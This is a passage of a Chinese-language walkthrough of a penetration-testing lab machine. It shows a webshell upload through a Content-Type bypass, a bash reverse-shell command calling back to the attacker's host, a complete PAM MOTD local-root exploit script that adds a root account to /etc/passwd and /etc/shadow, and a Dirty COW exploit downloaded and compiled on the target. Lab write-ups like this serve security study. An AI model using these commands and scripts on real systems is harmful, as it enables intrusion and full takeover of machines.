+<p>尝试修改<code>Content-Type</code>值为<code>image/png</code>后上传成功，猜测 web 应用程序主要判断<code>Content-type</code>类型，将其修改为正常的图片类型可绕过上传限制<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2009.50.15.png" alt="截屏2022-05-07 09.50.15"></p>
+<p>为了验证这一猜想，我们只修改图片上传数据包的<code>Content-type</code>的值。结果同样也无法上传，说明猜想正确<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2009.44.53.png" alt="截屏2022-05-07 09.44.53"></p>
+<p>访问<code>/torrent/upload</code>路径并找到之前上传木马文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.04.36.png" alt="截屏2022-05-07 10.04.36"></p>
+<p>访问木马地址并尝试执行命令，命令执行成功</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.6/torrent/upload/708759a17400cb3d4368e4769048f3d61e5466e3.php?cmd=id</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.09.02.png" alt="截屏2022-05-07 10.09.02"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>在本地监听 443 端口用于接收反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc nvlp 443</span><br></pre></td></tr></table></figure>
+
+<p>使用木马执行命令并尝试获取反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.6/torrent/upload/708759a17400cb3d4368e4769048f3d61e5466e3.php --data-urlencode &quot;cmd=bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.7/443 0&gt;&amp;1&#x27;&quot;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.14.21.png" alt="截屏2022-05-07 10.14.21"></p>
+<p>成功收到反弹shell，在用户目录中寻找第一个flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/george</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.16.41.png" alt="截屏2022-05-07 10.16.41"></p>
+<p>成功在用户目录中发现第一个flag</p>
+<h2 id="0x03-权限提升-root"><a href="#0x03-权限提升-root" class="headerlink" title="0x03 权限提升[root]"></a>0x03 权限提升[root]</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>枚举当前用户目录，发现文件<code>motd.legal-displayed</code>，虽然该文件是空的，但是这类文件可能会导致远程代码执行漏洞的产生</p>
+<p><strong>参考文章：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/14339">https://www.exploit-db.com/exploits/14339</a></strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">find . -type f -ls</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.21.58.png" alt="截屏2022-05-07 10.21.58"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.23.14.png" alt="截屏2022-05-07 10.23.14"></p>
+<h3 id="MODT提权"><a href="#MODT提权" class="headerlink" title="MODT提权"></a>MODT提权</h3><p>通过阅读该漏洞的利用代码，该漏洞出现于用户登录时会调用 PAM 对<code>~/.cache</code>设置目录权限。由于当前环境为反弹shell，因此我们无法触发该漏洞，但我们可以写入 SSH 密钥用于登录，将<code>~/.cache</code>替换为需要的文件符号链接，比如<code>passwd</code>。替换完成后再次登录该文件会被当前用户调用，从而完成权限提升。</p>
+<h4 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h4><p>查看当前用户对<code>~/.cache</code>目录的权限，该目录中的<code>motd.legal-displayed</code>归 george 所有，权限为可读可写，因此我们无法删除该文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l .cache</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.57.17.png" alt="截屏2022-05-07 10.57.17"></p>
+<p>在当前用户的主目录下创建<code>.ssh</code>目录并使用 ssh-keygen 生成 SSH 密钥对</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir .ssh</span><br><span class="line">ssh-keygen -q -t rsa -N &#x27;&#x27; -C &#x27;pam&#x27;</span><br><span class="line">ls .ssh</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.08.09.png" alt="截屏2022-05-07 11.08.09"></p>
+<p>将公钥复制到<code>authorized_keys</code>并设置权限为600</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp .ssh/id_rsa.pub .ssh/authorized_keys</span><br><span class="line">chmod 600 .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.12.19.png" alt="截屏2022-05-07 11.12.19"></p>
+<p>与此同时当前目录中并没有<code>.cache</code>目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.12.26.png" alt="截屏2022-05-07 11.12.26"></p>
+<p>复制 www-data 用户私钥并连接目标的ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 key</span><br><span class="line">ssh -i key www-data@10.10.10.6</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.23.37.png" alt="截屏2022-05-07 11.23.37"></p>
+<p>在主目录下出现<code>~/.cache</code>目录并在其中发现<code>motd.legal-displayed</code>文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find .cache/ -type f -ls</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.27.13.png" alt="截屏2022-05-07 11.27.13"></p>
+<h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><p>删除<code>~/.cache</code>目录并将其替换为<code>/etc/passwd</code>的文件符号链接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/.cache</span><br><span class="line">ln -s /etc/passwd ~/.cache</span><br><span class="line">ls -la ~/.cache</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.31.23.png" alt="截屏2022-05-07 11.31.23"></p>
+<p>再次登录ssh，发现<code>/etc/passwd</code>权限已经归 www-data 所有</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i key www-data@10.10.10.6</span><br><span class="line">ls -la /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.33.48.png" alt="截屏2022-05-07 11.33.48"></p>
+<p>既然有了写入权限，我们可以尝试添加 root 用户，在此之前我们还需要获取密码的哈希值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 mac</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.36.32.png" alt="截屏2022-05-07 11.36.32"></p>
+<p>添加用户至<code>/etc/passwd</code>，其中用户和密码都是 mac，用户和用户组都为0代表 root，描述为 pwned，主目录是<code>/root</code>，shell 是<code>/bin/bash</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;mac:$1$Of8Jy30x$uJx7pE./n1MKDpac9gBsk1:0:0:pwned:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>su</code>命令获取 root 权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - mac</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2013.08.58.png" alt="截屏2022-05-07 13.08.58"></p>
+<p>在<code>/root</code>下寻找第二个flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2013.09.19.png" alt="截屏2022-05-07 13.09.19"></p>
+<p>成功找到第二个flag</p>
+<h4 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">P=&#x27;toor:x:0:0:root:/root:/bin/bash&#x27;</span><br><span class="line">S=&#x27;toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::&#x27;</span><br><span class="line">echo &quot;[*] Ubuntu PAM MOTD local root&quot;</span><br><span class="line">[ -z &quot;$(which ssh)&quot; ] &amp;&amp; echo &quot;[-] ssh is a requirement&quot; &amp;&amp; exit 1</span><br><span class="line">[ -z &quot;$(which ssh-keygen)&quot; ] &amp;&amp; echo &quot;[-] ssh-keygen is a requirement&quot; &amp;&amp; exit 1</span><br><span class="line">[ -z &quot;$(ps -u root |grep sshd)&quot; ] &amp;&amp; echo &quot;[-] a running sshd is a requirement&quot; &amp;&amp; exit 1</span><br><span class="line">backup() &#123;</span><br><span class="line">    [ -e &quot;$1&quot; ] &amp;&amp; [ -e &quot;$1&quot;.bak ] &amp;&amp; rm -rf &quot;$1&quot;.bak</span><br><span class="line">    [ -e &quot;$1&quot; ] || return 0</span><br><span class="line">    mv &quot;$1&quot;&#123;,.bak&#125; || return 1</span><br><span class="line">    echo &quot;[*] Backuped $1&quot;</span><br><span class="line">&#125;</span><br><span class="line">restore() &#123;</span><br><span class="line">    [ -e &quot;$1&quot; ] &amp;&amp; rm -rf &quot;$1&quot;</span><br><span class="line">    [ -e &quot;$1&quot;.bak ] || return 0</span><br><span class="line">    mv &quot;$1&quot;&#123;.bak,&#125; || return 1</span><br><span class="line">    echo &quot;[*] Restored $1&quot;</span><br><span class="line">&#125;</span><br><span class="line">key_create() &#123;</span><br><span class="line">    backup ~/.ssh/authorized_keys</span><br><span class="line">    ssh-keygen -q -t rsa -N &#x27;&#x27; -C &#x27;pam&#x27; -f &quot;$KEY&quot; || return 1</span><br><span class="line">    [ ! -d ~/.ssh ] &amp;&amp; &#123; mkdir ~/.ssh || return 1; &#125;</span><br><span class="line">    mv &quot;$KEY.pub&quot; ~/.ssh/authorized_keys || return 1</span><br><span class="line">    echo &quot;[*] SSH key set up&quot;</span><br><span class="line">&#125;</span><br><span class="line">key_remove() &#123;</span><br><span class="line">    rm -f &quot;$KEY&quot;</span><br><span class="line">    restore ~/.ssh/authorized_keys</span><br><span class="line">    echo &quot;[*] SSH key removed&quot;</span><br><span class="line">&#125;</span><br><span class="line">own() &#123;</span><br><span class="line">    [ -e ~/.cache ] &amp;&amp; rm -rf ~/.cache</span><br><span class="line">    ln -s &quot;$1&quot; ~/.cache || return 1</span><br><span class="line">    echo &quot;[*] spawn ssh&quot;</span><br><span class="line">    ssh -o &#x27;NoHostAuthenticationForLocalhost yes&#x27; -i &quot;$KEY&quot; localhost true</span><br><span class="line">    [ -w &quot;$1&quot; ] || &#123; echo &quot;[-] Own $1 failed&quot;; restore ~/.cache; bye; &#125;</span><br><span class="line">    echo &quot;[+] owned: $1&quot;</span><br><span class="line">&#125;</span><br><span class="line">bye() &#123;</span><br><span class="line">    key_remove</span><br><span class="line">    exit 1</span><br><span class="line">&#125;</span><br><span class="line">KEY=&quot;$(mktemp -u)&quot;</span><br><span class="line">key_create || &#123; echo &quot;[-] Failed to setup SSH key&quot;; exit 1; &#125;</span><br><span class="line">backup ~/.cache || &#123; echo &quot;[-] Failed to backup ~/.cache&quot;; bye; &#125;</span><br><span class="line">own /etc/passwd &amp;&amp; echo &quot;$P&quot; &gt;&gt; /etc/passwd</span><br><span class="line">own /etc/shadow &amp;&amp; echo &quot;$S&quot; &gt;&gt; /etc/shadow</span><br><span class="line">restore ~/.cache || &#123; echo &quot;[-] Failed to restore ~/.cache&quot;; bye; &#125;</span><br><span class="line">key_remove</span><br><span class="line">echo &quot;[+] Success! Use password toor to get root&quot;</span><br><span class="line">su -c &quot;sed -i &#x27;/toor:/d&#x27; /etc/&#123;passwd,shadow&#125;; chown root: /etc/&#123;passwd,shadow&#125;; \</span><br><span class="line">  chgrp shadow /etc/shadow; nscd -i passwd &gt;/dev/null 2&gt;&amp;1; bash&quot; toor</span><br></pre></td></tr></table></figure>
+<p>脚本分别定义了<code>backup()</code>、<code>restore()</code>、<code>key_create()</code>、<code>key_remove()</code>、<code>own()</code>、<code>bye()</code>等一堆函数，执行流程如下：</p>
+<blockquote>
+<ul>
+<li><code>key_create()</code>创建SSH密钥对以便当前用户通过私钥无密码登录</li>
+<li><code>backup()</code>备份<code>~/.cache</code>目录</li>
+<li><code>own()</code>会删除<code>~/.cache</code>目录并创建文件符号链接，通过该函数分别指向<code>/etc/passwd</code>、<code>/etc/shadow</code>，然后断开连接验证当前用户是否已拥有目标文件的写入权限</li>
+<li><code>restore()</code>用来恢复<code>~/.cache</code>目录</li>
+<li><code>key_remove()</code>则会清理刚刚添加的SSH密钥</li>
+<li>清理痕迹完成后再自动启动 root 权限的 shell</li>
+</ul>
+</blockquote>
+<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>内核漏洞一直都是提权的第一选择，那么在该靶机中我们也可以尝试进行脏牛提权，首先查看系统版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2016.05.14.png" alt="截屏2022-05-07 16.05.14"></p>
+<p>在漏洞利用参考列表中发现该版本的 ubuntu 系统能够使用脏牛提权。根据 POC 列表我们可使用 <a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow/blob/master/dirty.c">dirty.c</a> 直接提权</p>
+<p><strong>参考列表：<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions">https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions</a></strong></p>
+<p><strong>POC列表：<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></strong></p>
+<p>使用 python 开启 web 服务用于传输<code>dirty.c</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>在靶机中通过 wget 下载利用代码并完成编译</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.7/dirty.c</span><br><span class="line">chmod 777 dirty.c</span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2016.22.52.png" alt="截屏2022-05-07 16.22.52"></p>
+<p>运行后可成功提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x dirty</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2016.27.37.png" alt="截屏2022-05-07 16.27.37"></p>
+<p>由于<code>su</code>命令必须在终端执行，因此需要以 www-data 用户身份登录ssh，输入以上账号密码可成功获取 root 权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - firefart</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2016.29.54.png" alt="截屏2022-05-07 16.29.54"></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>通过对站点进行目录扫描后我们发现三个目录，分别是phpinfo界面、重命名API以及提供 Torrent Hoster 实例的应用程序。在应用中注册用户后发现其中存在种子上传点，与此同时还能上传图片。在尝试对图片上传点上传木马后发现应用存在防御机制，修改Content-Type可以绕过限制。使用木马执行命令成功收到反弹shell。</p>
+<p>上线后当前权限为www-data，通过信息收集发现MOTD文件，而该文件能够帮助我们完成权限提升。该漏洞主要是因为用户登录时会调用 PAM 对<code>~/.cache</code>设置目录权限，因此需要我们生成密钥对来登录目标用户ssh，将<code>~/.cache</code>替换为管理员执行命令/etc/passwd，再次登录后会调用PAM重设该命令所有者，从而我们就能够添加管理员用户完成权限提升。当然还有个经典方法：脏牛提权，这个方式就不再赘述了，有想要了解的朋友可以直接看操作步骤。</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
